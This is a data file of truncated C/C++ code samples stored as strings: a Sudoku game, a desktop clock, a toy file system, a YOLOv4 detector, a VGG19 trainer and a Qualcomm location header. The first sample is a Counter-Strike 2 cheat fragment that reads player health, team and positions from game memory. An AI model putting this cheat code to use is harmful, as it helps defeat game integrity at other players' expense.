clientJson[\"client.dll\"][\"classes\"][\"C_BaseEntity\"][\"fields\"][\"m_iTeamNum\"]);\r\n\treturn teamNum;\r\n}\r\n\r\nbool game::CSplayerController::getIsAlive() {\r\n\tthis->isPawnAlive = mem.Read<bool>(this->controller + clientJson[\"client.dll\"][\"classes\"][\"CCSPlayerController\"][\"fields\"][\"m_bPawnIsAlive\"]);\r\n\treturn isPawnAlive;\r\n}\r\n\r\nuintptr_t game::CSplayerPawn::getPawn() {\r\n\tthis->pawn = mem.Read<uintptr_t>(offsets.listEntry + 0x78 * (this->value & 0x1FF));\r\n\treturn pawn;\r\n}\r\n\r\nuintptr_t game::CSplayerController::getController() {\r\n\tthis->controller = mem.Read<uintptr_t>(offsets.listEntry + 0x78 * (uintptr_t)(this->num & 0x1FF));\r\n\treturn controller;\r\n}\r\n\r\nuintptr_t game::CSplayerController::get_CSPlayerPawn() {\r\n\treturn mem.Read<uintptr_t>(this->controller + clientJson[\"client.dll\"][\"classes\"][\"CCSPlayerController\"][\"fields\"][\"m_hPlayerPawn\"]);\r\n}\r\n\r\nint game::CSplayerPawn::getPlayerHealth() {\r\n\tthis->playerHealth = mem.Read<int>(this->pawn + clientJson[\"client.dll\"][\"classes\"][\"C_BaseEntity\"][\"fields\"][\"m_iHealth\"]);\r\n\treturn playerHealth;\r\n}\r\n\r\nVec3 game::CSplayerPawn::getFeetPos() {\r\n\tthis->feetPos = mem.Read<Vec3>(this->pawn + clientJson[\"client.dll\"][\"classes\"][\"C_BasePlayerPawn\"][\"fields\"][\"m_vOldOrigin\"]);\r\n\treturn feetPos; \r\n}\r\n\r\nVec2 game::CSplayerPawn::getViewAngles() {\r\n\tthis->viewAng",
    "#include \"StateMachine.h\"\n\n\nstd::string toLower(std::string str);\nstd::string toUpper(std::string str);\nint contains(std::string str, std::string subStr);\n\nStateMachine::StateMachine()\n{\n    setMessageBuffer(\"\");\n    setNewState(SUDOKU_START_SCREEN,false);\n    setScreenSize(DEFAULT_SCREEN_SIZE);\n    setCategory(EASY);\n    setPuzzleNumber(1);\n}\n\n\nsudoku_state StateMachine::getCurrentState() {\n    return _state;\n}\n\nvoid StateMachine::setNewState(sudoku_state state, bool setPreviousState)\n{\n    if(setPreviousState) _previousStates.push(_state);\n    setMessageBuffer(\"\");\n    _state = state;\n}\n\nvoid StateMachine::pushPreviousState(sudoku_state state)\n{\n    if(_previousStates.size() < MAX_PREV_STATES) {\n        _previousStates.push(state);\n    } else {\n        std::cout << \"Error: _previousStates stack overflow..\\r\\n\";\n    }\n}\nsudoku_state StateMachine::popPreviousState()\n{\n    if(!_previousStates.empty()) {\n        sudoku_state prevState = _previousStates.top();\n        _previousStates.pop();\n        return prevState;\n    } else {\n        //error, return back to start screen for now\n        return SUDOKU_START_SCREEN;\n    }\n}\n\nstd::string StateMachine::getMessageBuffer()\n{\n    return _messageBuffer;\n}\n\nvoid StateMachine::setMessageBuffer(std::string str)\n{\n    _messageBuffer = str;\n}\n\nsudoku_category StateMachine::getCategory() {\n    return _category;\n}\n\nvoid StateMachine::setCategory(sudoku_category category)\n{\n    _category = category;\n}\n\nstd::string StateMachine::getCategoryString()\n{\n    switch(getCategory())\n    {\n        case EASY:\n            return \"Easy\";\n        case MEDIUM:\n            return \"Medium\";\n        case HARD:\n            return \"Hard\";\n        case EXPERT:\n            return \"Expert\";\n        case MASTER:\n            return \"Master\";\n        case EXTREME:\n            return \"Extreme\";\n        default:\n            return \"???\";\n    }\n}\n\nint StateMachine::getScreenSize()\n{\n    return _screenSize;\n}\n\nvoid StateMachine::setScreenSize(int screenSize)\n{\n    _screenSize = screenSize;\n}\n\nint StateMachine::getPuzzleNumber()\n{\n    return _puzzleNumber;\n}\n\nvoid StateMachine::setPuzzleNumber(int puzzleNumber)\n{\n    _puzzleNumber = puzzleNumber;\n}\n\nstd::string StateMachine::getPuzzleString()\n{\n   return \"puzzle\" + std::to_string(getPuzzleNumber());\n}\n\nbool isInteger(std::string str)\n{\n    int strSize = str.size();\n    if(strSize < 1) return false;\n    for(int i = 0; i < str.size(); i++) {\n        if(!isdigit(str[i])) return false;\n    }\n    return true;\n}\n\nvoid displayVector(std::vector<int> vec)\n{\n    int vecSize = vec.size();\n    for(int i = 0; i < vecSize; i++) {\n        std::cout << vec[i] << \" \";\n    }\n    std::cout << std::endl;\n}\n\nvoid padScreen(int num)\n{\n    if(num < 1) return;\n    std::cout << std::string(num - 1,'\\n');\n    std::cout << std::endl;\n}\n\nvoid StateMachine::clearScreen()\n{\n    padScreen(_screenSize << 4);\n}\n\nvoid StateMachine::displayMessageBar()\n{\n    std::cout << std::string(80,'-') << std::endl;\n    std::cout << \"Output: \" << getMessageBuffer() << std::endl;\n    std::cout << std::string(80,'-') << std::endl;\n}\n\n//todo figure out issue with weird screen buffer\nvoid StateMachine::displayScreenBar(sudoku_state state)\n{\n    std::string screenStr;\n    switch(state)\n    {\n        case SUDOKU_START_SCREEN:\n        {\n            screenStr = \"Sudoku for Terminal! (LMC 2024)\";\n            break;\n        }\n        case SUDOKU_PLAY_SCREEN:\n        {\n            if(!getSudokuGrid()->isSolved()) {\n                screenStr = \"Solve the puzzle.\";\n            }\n            else {\n                screenStr = \"Congratulations! Puzzle solved!\";\n            }\n            break;\n        }\n        case SUDOKU_CATEGORY_SELECT_SCREEN:\n        {\n            screenStr = \"Select Difficulty\";\n            break;\n        }\n        case SUDOKU_PUZZLE_SELECT_SCREEN:\n        {\n            screenStr = \"Select Puzzle Number\";\n            break;\n        }\n        case SUDOKU_OPTIONS_SCREEN:\n        {\n            screenStr = \"Configure Options\";\n            break;\n        }\n        case SUDOKU_LIST_SCREEN:\n        {\n            screenStr = \"Command List\";\n            sudoku_state prevState = _previousStates.top();\n            switch(prevState)\n            {\n                case SUDOKU_PLAY_SCREEN:\n                {\n                    screenStr = \"Sudoku \" + screenStr;\n                    break;\n                }\n                case SUDOKU_OPTIONS_SCREEN:\n                {\n                    screenStr = \"Options \" + screenStr;\n                    break;\n                }\n                case SUDOKU_PUZZLE_SELECT_SCREEN:\n                {\n                    screenStr = \"Puzzle Select \" + screenStr;\n                    break;\n                }\n                case SUDOKU_CATEGORY_SELECT_SCREEN:\n                {\n                    screenStr = \"Difficulty Select \" + screenStr;\n                    break;\n                }\n            }\n            break;\n        }\n        case SUDOKU_HELP_SCREEN:\n        {\n       ",
    "// DesktopClock.cpp : Defines the entry point for the application.\n//\n#pragma warning(disable : 4996)\n\n#include \"framework.h\"\n#include \"DesktopClock.h\"\n\n#include <exception>\n#include <cstdio>\n#include <tuple>\n#include <string>\n#include <codecvt>\n#include <locale>\n#include <atomic>\n#include <chrono>\n#include <thread>\n#include <iomanip>\n\nconstexpr auto MAX_LOADSTRING = 100;\n\n// Global Variables:\nHINSTANCE hInst;                      // current instance\nWCHAR szTitle[MAX_LOADSTRING];        // The title bar text\nWCHAR szWindowClass[MAX_LOADSTRING];  // the main window class name\n\n// Forward declarations of functions included in this code module:\nATOM RegisterWindowClass(HINSTANCE hInstance);\nBOOL InitInstance(HINSTANCE, int);\nLRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);\n\n// Direct2D globals\nstatic ComPtr<ID2D1Factory> g_pD2DFactory;\nstatic ComPtr<IDWriteFactory> g_pDWriteFactory;\nstatic ComPtr<ID2D1HwndRenderTarget> g_pD2DRenderTarget;\nstatic ComPtr<IDWriteTextFormat> g_pTimeFont;\nstatic ComPtr<IDWriteTextFormat> g_pDateFont;\n\nnamespace {\n    class com_exception : public std::exception {\n    public:\n        com_exception(HRESULT hr) noexcept : result(hr) {}\n\n        const char* what() const noexcept override {\n            static char s_str[64] = {};\n            sprintf_s(s_str, \"Failure with HRESULT of %08X\", static_cast<unsigned int>(result));\n            return s_str;\n        }\n\n    private:\n        HRESULT result;\n    };\n\n    void ThrowIfFailed(HRESULT hr) {\n        if (FAILED(hr)) {\n            throw com_exception(hr);\n        }\n    }\n\n    void ANSIToWide(const std::string& value, std::wstring& converted) {\n        std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;\n        converted = converter.from_bytes(value);\n    }\n}  // namespace\n\nnamespace Clock {\n    static std::atomic<bool> g_aRunning(true);\n\n    static void ClockThread(HWND hwnd) {\n        while (g_aRunning) {\n            std::this_thread::sleep_for(std::chrono::seconds(1));\n            InvalidateRect(hwnd, nullptr, false);  // Trigger a redraw\n        }\n    }\n\n    static std::wstring GetCurrentDay() {\n        auto now            = std::chrono::system_clock::now();\n        std::time_t nowTime = std::chrono::system_clock::to_time_t(now);\n        std::tm* nowTm      = std::localtime(&nowTime);\n\n        std::wstring weekDay;\n        switch (nowTm->tm_wday) {\n            case 0:\n                return L\"SUNDAY\";\n            case 1:\n                return L\"MONDAY\";\n            case 2:\n                return L\"TUESDAY\";\n            case 3:\n                return L\"WEDNESDAY\";\n            case 4:\n                return L\"THURSDAY\";\n            case 5:\n                return L\"FRIDAY\";\n            case 6:\n                return L\"SATURDAY\";\n            default:\n                return L\"\";\n        }\n    }\n\n    static std::wstring GetTime() {\n        SYSTEMTIME time;\n        GetLocalTime(&time);\n\n        int hour            = time.wHour;\n        const wchar_t* ampm = L\"AM\";\n\n        if (hour == 0)\n            hour = 12;\n        else if (hour == 12)\n            ampm = L\"PM\";\n        else if (hour > 12) {\n            hour -= 12;\n            ampm = L\"PM\";\n        }\n\n        wchar_t timeStr[100];\n        swprintf_s(timeStr, L\"%02d:%02d:%02d %s\", hour, time.wMinute, time.wSecond, ampm);\n        return timeStr;\n    }\n\n    static std::wstring GetCurrentDate() {\n        auto now            = std::chrono::system_clock::now();\n        std::time_t nowTime = std::chrono::system_clock::to_time_t(now);\n        std::tm* nowTm      = std::localtime(&nowTime);\n        char dateStr[100];\n        std::strftime(dateStr, sizeof(dateStr), \"%B %d, %Y\", nowTm);\n\n        std::wstring out;\n        ANSIToWide(dateStr, out);\n        // Convert text to all uppercase letters\n        std::transform(out.begin(), out.end(), out.begin(), [](unsigned char t) {\n            return std::toupper(t);\n        });\n\n        return out;\n    }\n}  // namespace Clock\n\nstatic void InitializeD2D(HWND hwnd) {\n    ThrowIfFailed(\n      D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, IID_PPV_ARGS(&g_pD2DFactory)));\n\n    RECT rc;\n    GetClientRect(hwnd, &rc);\n    ThrowIfFailed(g_pD2DFactory->CreateHwndRenderTarget(\n      D2D1::RenderTargetProperties(),\n      D2D1::HwndRenderTargetProperties(hwnd, D2D1::SizeU(rc.right, rc.bottom)),\n      &g_pD2DRenderTarget));\n\n    ThrowIfFailed(DWriteCreateFactory(DWRITE_FACTORY_TYPE_SHARED,\n                                      __uuidof(IDWriteFactory),\n                                      (IUnknown**)&g_pDWriteFactory));\n\n    // Create fonts\n    ThrowIfFailed(g_pDWriteFactory->CreateTextFormat(L\"Chakra Petch\",\n                                                     nullptr,\n                                                     DWRITE_FONT_WEIGHT_BLACK,\n                                                     DWRITE_FONT_STYLE_NORMAL,\n                                                     DWRITE_FONT_STRETCH_NORMAL,\n                                       ",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\n#include<unistd.h>\n#include<iostream>\n// #include<io.h>\n\n#define MAXINODE 5\n\n#define READ 1\n#define WRITE 2\n\n#define MAXFILESIZE 2048\n\n#define REGULAR 1\n#define SPECIAL 2\n\n#define START 0\n#define CURRENT 1\n#define END 2\n\ntypedef struct superblock\n{\n    int TotalInodes;\n    int FreeInodes;\n}SUPERBLOCK, *PSUPERBLOCK;\n\ntypedef struct inode\n{\n    char FileName[50];\n    int InodeNumber;\n    int FileSize;\n    int FileActualSize;\n    int FileType;\n    char *Buffer;\n    int LinkCount;\n    int ReferenceCount;\n    int permission; //1         23\n    struct inode *next;\n}INODE, *PINODE, **PPINODE;\n\ntypedef struct filetable\n{\n    int readoffset;\n    int writeoffset;\n    int count;\n    int mode; // 1 2 3 \n    PINODE ptrinode;\n}FILETABLE, *PFILETABLE;\n\ntypedef struct ufdt\n{\n    PFILETABLE ptrfiletable;\n}UFDT;\n\nUFDT UFDTArr[50];\nSUPERBLOCK SUPERBLOCKobj;\nPINODE head = NULL;\n\nvoid man(char *name)\n{\n    if(name == NULL) return;\n\n    if(strcmp(name,\"create\")==0)\n    {\n        printf(\"Description : Used to create new regular file\\n\");\n        printf(\"Usage : create File_name Permission\\n\");\n    }\n    else if(strcmp(name,\"read\")==0)\n    {\n        printf(\"description: Used to raed data from regular file\\n\");\n        printf(\"Usage : read File_name No_Of_Bytes_To_Read\\n\");\n    }\n    else if(strcmp(name,\"write\")==0)\n    {\n        printf(\"Description: Used to write into regular file\\n\");\n        printf(\"Usage : write File_name\\n After this enter the data that we want to write\\n\");\n    }\n    else if(strcmp(name,\"Is\")==0)\n    {\n        printf(\"Description: Used to list all infromation of files\\n\");\n        printf(\"Usage : Is\\n\");\n    }\n    else if(strcmp(name,\"stat\")==0)\n    {\n        printf(\"Description: Used to display information of file\\n\");\n        printf(\"Usage : stat File Descriptor\\n\");\n    }\n    else if(strcmp(name,\"fstat\")==0)\n    {\n        printf(\"Description: Used to display information offile\\n\");\n        printf(\"Usage : stat File Descriptor\\n\");\n    }\n    else if(strcmp(name,\"truncate\")==0)\n    {\n        printf(\"Description: Used to remove data from file\\n\");\n        printf(\"Usage : truncate File_name\\n\");\n    }\n    else if(strcmp(name,\"open\")==0)\n    {\n        printf(\"Description: Used to open existing file\\n\");\n        printf(\"Usage : open File_name mode\\n\");\n    }\n    else if(strcmp(name,\"close\")==0)\n    {\n        printf(\"Description: Used to close opened file\\n\");\n        printf(\"Usage : close File_name\\n\");\n    }\n    else if(strcmp(name,\"close\")==0)\n    {\n        printf(\"Description: Used to close all opened file\\n\");\n        printf(\"Usage : close all\\n\");\n    }\n    else if(strcmp(name,\"lseek\")==0)\n    {\n        printf(\"Description: Used to change file offset\\n\");\n        printf(\"Usage : lseek FileName ChangeInOffsert StartPoint\\n\");\n    }\n    else if(strcmp(name,\"rm\")==0)\n    {\n        printf(\"Description: Used to delete the file\\n\");\n        printf(\"Usage : rm File_name\\n\");\n    }\n    else\n    {\n        printf(\"ERROR : No manual entry avaialble. \\n\");\n    }\n}\n\nvoid DisplayHelp()\n{\n    printf(\"Is : List out all file\\n\");\n    printf(\"clear : To clear console\\n\");\n    printf(\"open : To open the file\\n\");\n    printf(\"close : To close the File\\n\");\n    printf(\"closeall : To close all opened files\\n\");\n    printf(\"read : To read the contents into file\\n\");\n    printf(\"write : To Write contents into the file\\n\");\n    printf(\"exit : To Terminate file system\\n\");\n    printf(\"stat : To Display information of file using name\\n\");\n    printf(\"fstat : To Display information of file using file descriptor\\n\");\n    printf(\"truncate : To Remove all data from file\\n\");\n    printf(\"rm : To Delete the File\\n\");\n}\n\nint GetFDFromName(char *name)\n{\n    int i = 0;\n\n    while(i<50)\n    {\n        if(UFDTArr[i].ptrfiletable != NULL)\n            if(strcmp((UFDTArr[i].ptrfiletable->ptrinode->FileName),name)==0)\n                break;\n            i++;\n    }\n\n    if(i == 50)     return -1;\n    else            return i;\n}\n\nPINODE Get_Inode(char * name)\n{\n    PINODE temp = head;\n    int i = 0;\n\n    if(name == NULL)\n        return NULL;\n\n    while(temp != NULL)\n    {\n        if(strcmp(name,temp->FileName) == 0)\n            break;\n        temp = temp->next;\n    }\n    return temp;\n}\n\nvoid CreateDILB()\n{\n    int i = 1;\n    PINODE newn = NULL;\n    PINODE temp = head;\n\n    while( i<= MAXINODE)\n    {\n            newn = (PINODE)malloc(sizeof(INODE));\n\n        newn->LinkCount = 0;\n        newn->ReferenceCount = 0;\n        newn->FileType = 0;\n        newn->FileSize = 0;\n\n            newn->Buffer = NULL;\n            newn->next = NULL;\n        \n        newn->InodeNumber = i;\n\n            if(temp == NULL)\n            {\n                head = newn;\n                temp = head;\n            }\n            else\n            {\n                temp->next = newn;\n                temp= temp->next;\n            }\n            i++;\n    }\n    printf(\"DILB created successfully\\n\");\n}\n\nvoid InitialiseSuperBlock()\n{\n    i",
    "#include <map>\r\n#include <opencv2/imgproc.hpp>\r\n#include \"yolov4.h\"\r\n#include \"data_struct.h\"\r\n\r\n\r\nYoloV4::YoloV4() {\r\n\r\n}\r\n\r\nYoloV4::~YoloV4() {\r\n    net.clear();\r\n}\r\n\r\nint YoloV4::load(ncnn::Option option, const char *modeltype) {\r\n    int r = load(nullptr, option, modeltype);\r\n    return r;\r\n}\r\n\r\nint YoloV4::load(AAssetManager *mgr, ncnn::Option option, const char *modeltype) {\r\n    net.opt = option;\r\n\r\n    const std::map<std::string, int> _target_sizes = {\r\n            {\"yolov4-tiny\", 416},\r\n    };\r\n\r\n    const std::map<std::string, std::vector<float>> _mean_vals = {\r\n            {\"yolov4-tiny\", {0.0f, 0.0f, 0.0f}},\r\n    };\r\n\r\n    const std::map<std::string, std::vector<float>> _norm_vals = {\r\n            {\"yolov4-tiny\", {1 / 255.f, 1 / 255.f, 1 / 255.f}},\r\n    };\r\n\r\n    target_size = _target_sizes.at(modeltype);\r\n    mean_vals[0] = _mean_vals.at(modeltype)[0];\r\n    mean_vals[1] = _mean_vals.at(modeltype)[1];\r\n    mean_vals[2] = _mean_vals.at(modeltype)[2];\r\n    norm_vals[0] = _norm_vals.at(modeltype)[0];\r\n    norm_vals[1] = _norm_vals.at(modeltype)[1];\r\n    norm_vals[2] = _norm_vals.at(modeltype)[2];\r\n\r\n    char parampath[256];\r\n    char modelpath[256];\r\n    sprintf(parampath, \"%s.param\", modeltype);\r\n    sprintf(modelpath, \"%s.bin\", modeltype);\r\n\r\n    int pr, mr;\r\n    if (mgr != nullptr) {\r\n        pr = net.load_param(mgr, parampath);\r\n        mr = net.load_model(mgr, modelpath);\r\n    } else {\r\n        pr = net.load_param(parampath);\r\n        mr = net.load_model(modelpath);\r\n    }\r\n    if (pr != 0 || mr != 0) {\r\n        TLOGE(\"load mode failed: %s\", modeltype);\r\n    }\r\n    return (pr == 0) && (mr == 0);\r\n\r\n}\r\n\r\nint YoloV4::detect(const cv::Mat &rgb, std::vector<BoxInfo> &objects, float prob_threshold, float nms_threshold) {\r\n    int img_w = rgb.cols;\r\n    int img_h = rgb.rows;\r\n\r\n    // letterbox pad to multiple of 32\r\n    int w = img_w;\r\n    int h = img_h;\r\n    float scale = 1.f;\r\n    if (w > h) {\r\n        scale = (float) target_size / w;\r\n        w = target_size;\r\n        h = h * scale;\r\n    } else {\r\n        scale = (float) target_size / h;\r\n        h = target_size;\r\n        w = w * scale;\r\n    }\r\n\r\n    ncnn::Mat in = ncnn::Mat::from_pixels_resize(rgb.data, ncnn::Mat::PIXEL_RGB, img_w, img_h, w, h);\r\n\r\n    // pad to target_size rectangle\r\n    int wpad = (w + 31) / 32 * 32 - w;\r\n    int hpad = (h + 31) / 32 * 32 - h;\r\n    ncnn::Mat in_pad;\r\n    ncnn::copy_make_border(in,\r\n                           in_pad,\r\n                           hpad / 2,\r\n                           hpad / 2,\r\n                           wpad / 2,\r\n                           wpad / 2,\r\n                           ncnn::BORDER_CONSTANT,\r\n                           0.f);\r\n\r\n    // so for 0-255 input image, rgb_mean should multiply 255 and norm should div by std.\r\n    in_pad.substract_mean_normalize(mean_vals, norm_vals);\r\n\r\n    ncnn::Mat out;\r\n    ncnn::Extractor ex = net.create_extractor();\r\n    ex.input(\"data\", in_pad);\r\n    ex.extract(\"output\", out);\r\n    auto boxes = decode_infer(out, w + wpad, h + hpad);\r\n\r\n    int count = boxes.size();\r\n    objects.resize(count);\r\n    for (int i = 0; i < count; i++) {\r\n        objects[i] = boxes[i];\r\n\r\n        // adjust offset to original unpadded\r\n        float x0 = (objects[i].x1 - (wpad / 2)) / scale;\r\n        float y0 = (objects[i].y1 - (hpad / 2)) / scale;\r\n        float x1 = (objects[i].x2 - (wpad / 2)) / scale;\r\n        float y1 = (objects[i].y2 - (hpad / 2)) / scale;\r\n\r\n        // clip\r\n        x0 = std::max(std::min(x0, (float) (img_w - 1)), 0.f);\r\n        y0 = std::max(std::min(y0, (float) (img_h - 1)), 0.f);\r\n        x1 = std::max(std::min(x1, (float) (img_w - 1)), 0.f);\r\n        y1 = std::max(std::min(y1, (float) (img_h - 1)), 0.f);\r\n\r\n        objects[i].x1 = x0;\r\n        objects[i].y1 = y0;\r\n        objects[i].x2 = x1;\r\n        objects[i].y2 = y1;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\nint YoloV4::draw(cv::Mat &rgb, const std::vector<BoxInfo> &objects) {\r\n    static const char *class_names[] = {\r\n            \"person\", \"bicycle\", \"car\", \"motorcycle\", \"airplane\", \"bus\", \"train\", \"truck\", \"boat\", \"traffic light\",\r\n            \"fire hydrant\", \"stop sign\", \"parking meter\", \"bench\", \"bird\", \"cat\", \"dog\", \"horse\", \"sheep\", \"cow\",\r\n            \"elephant\", \"bear\", \"zebra\", \"giraffe\", \"backpack\", \"umbrella\", \"handbag\", \"tie\", \"suitcase\", \"frisbee\",\r\n            \"skis\", \"snowboard\", \"sports ball\", \"kite\", \"baseball bat\", \"baseball glove\", \"skateboard\", \"surfboard\",\r\n            \"tennis racket\", \"bottle\", \"wine glass\", \"cup\", \"fork\", \"knife\", \"spoon\", \"bowl\", \"banana\", \"apple\",\r\n            \"sandwich\", \"orange\", \"broccoli\", \"carrot\", \"hot dog\", \"pizza\", \"donut\", \"cake\", \"chair\", \"couch\",\r\n            \"potted plant\", \"bed\", \"dining table\", \"toilet\", \"tv\", \"laptop\", \"mouse\", \"remote\", \"keyboard\",\r\n            \"cell phone\", \"microwave\", \"oven\", \"toaster\", \"sink\", \"refrigerator\", \"book\", \"clock\", \"vase\", \"scissors\",\r\n            \"teddy bear\", \"hair drier\", \"toothbrush\"\r\n    };\r\n    static const unsigned ",
    "#include <torch/torch.h>\n#include <iostream>\n#include <chrono>\n\n\nstruct VGG19 : torch::nn::Module {\n    torch::nn::Sequential features;\n    torch::nn::Sequential classifier;\n\n    VGG19(int num_classes = 1000) {\n        // Features part\n        features = torch::nn::Sequential(\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(3, 64, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(64, 64, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::MaxPool2d(torch::nn::MaxPool2dOptions(2).stride(2)),\n\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(64, 128, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(128, 128, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::MaxPool2d(torch::nn::MaxPool2dOptions(2).stride(2)),\n\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(128, 256, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(256, 256, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(256, 256, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(256, 256, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::MaxPool2d(torch::nn::MaxPool2dOptions(2).stride(2)),\n\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(256, 512, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(512, 512, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(512, 512, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(512, 512, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::MaxPool2d(torch::nn::MaxPool2dOptions(2).stride(2)),\n\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(512, 512, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(512, 512, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(512, 512, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::Conv2d(torch::nn::Conv2dOptions(512, 512, 3).padding(1)), torch::nn::ReLU(),\n            torch::nn::MaxPool2d(torch::nn::MaxPool2dOptions(2).stride(2))\n        );\n\n        // Classifier part\n        classifier = torch::nn::Sequential(\n            torch::nn::Linear(512 * 7 * 7, 4096), torch::nn::ReLU(), torch::nn::Dropout(),\n            torch::nn::Linear(4096, 4096), torch::nn::ReLU(), torch::nn::Dropout(),\n            torch::nn::Linear(4096, num_classes)\n        );\n\n        // Register modules\n        register_module(\"features\", features);\n        register_module(\"classifier\", classifier);\n    }\n\n    torch::Tensor forward(torch::Tensor x) {\n        x = features->forward(x);\n        x = x.view({ x.size(0), -1 });  // Flatten the output\n        x = classifier->forward(x);\n        return x;\n    }\n};\n\nint main() {\n    std::chrono::time_point<std::chrono::high_resolution_clock> start_train;\n    std::chrono::time_point<std::chrono::high_resolution_clock> end_train;\n    std::chrono::time_point<std::chrono::high_resolution_clock> start_val;\n    std::chrono::time_point<std::chrono::high_resolution_clock> end_val;\n    std::chrono::time_point<std::chrono::high_resolution_clock> start_total;\n    std::chrono::time_point<std::chrono::high_resolution_clock> end_total;\n    std::chrono::time_point<std::chrono::high_resolution_clock> start_program;\n    std::chrono::time_point<std::chrono::high_resolution_clock> end_program;\n\n    std::chrono::duration<double> total_train_time(0);\n    std::chrono::duration<double> total_valid_time(0);\n\n    start_program = std::chrono::high_resolution_clock::now();\n    if (torch::cuda::is_available()) {\n        std::cout << \"CUDA is available! Training on GPU.\" << std::endl;\n    }\n    else {\n        std::cout << \"CUDA is not available! Training on CPU.\" << std::endl;\n        return 0;\n    }\n\n    int batch_size = 64;\n    int epochs = 100;\n    torch::Tensor input;\n    torch::Tensor labels;\n    torch::Tensor val_input;\n    torch::Tensor val_labels;\n    torch::Tensor prediction;\n    torch::Tensor loss;\n    torch::Tensor val_prediction;\n    torch::Tensor val_loss;\n\n    auto model = std::make_shared<VGG19>(10);  // \ubaa8\ub378\uc758 \ucd9c\ub825\uc744 10\uac1c \ud074\ub798\uc2a4\ub85c \uc124\uc815\n    model->to(torch::kCUDA);  // GPU\ub85c \ubaa8\ub378\uc744 \uc62e\uae30\uae30 (GPU\uac00 \uc5c6\ub2e4\uba74 torch::kCPU)\n\n    // \uc190\uc2e4 \ud568\uc218\uc640 \uc635\ud2f0\ub9c8\uc774\uc800\n    //torch::nn::CrossEntropyLoss criterion;\n    torch::nn::L1Loss criterion;\n    torch::optim::Adam optimizer(model->parameters(), torch::optim::AdamOptions(1e-4));\n\n    // \ud559\uc2b5 \ub8e8\ud504\n    start_total = std::chrono::high_resolution_clock::now();\n    for (size_t epoch = 0; epoch < epochs; ++epoch) {\n        start_train = std::chrono::high_resolution_clock::now();\n        model->train();\n        float train_loss = 0.0;\n        for (int iter = 0; iter < 10; iter++) {\n            input = torch::rand({ batch_size,3,224,224 }).to(torch::kCUDA);\n            labels = torch::rand({ batch_size,10 }).to(torch::kCUDA);\n\n            pred",
    "/* Copyright (c) 2012-2015, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <log_util.h>\n#include \"loc_target.h\"\n#include \"loc_log.h\"\n#include <loc_pla.h>\n\n#define APQ8064_ID_1 \"109\"\n#define APQ8064_ID_2 \"153\"\n#define MPQ8064_ID_1 \"130\"\n#define MSM8930_ID_1 \"142\"\n#define MSM8930_ID_2 \"116\"\n#define APQ8030_ID_1 \"157\"\n#define APQ8074_ID_1 \"184\"\n\n#define LINE_LEN 100\n#define STR_LIQUID      \"Liquid\"\n#define STR_SURF        \"Surf\"\n#define STR_MTP         \"MTP\"\n#define STR_APQ         \"apq\"\n#define STR_SDC         \"sdc\"  // alternative string for APQ targets\n#define STR_QCS         \"qcs\"  // string for Gen9 APQ targets\n#define STR_MSM         \"msm\"\n#define STR_SDM         \"sdm\"  // alternative string for MSM targets\n#define STR_APQ_NO_WGR  \"baseband_apq_nowgr\"\n#define STR_AUTO        \"auto\"\n#define IS_STR_END(c) ((c) == '\\0' || (c) == '\\n' || (c) == 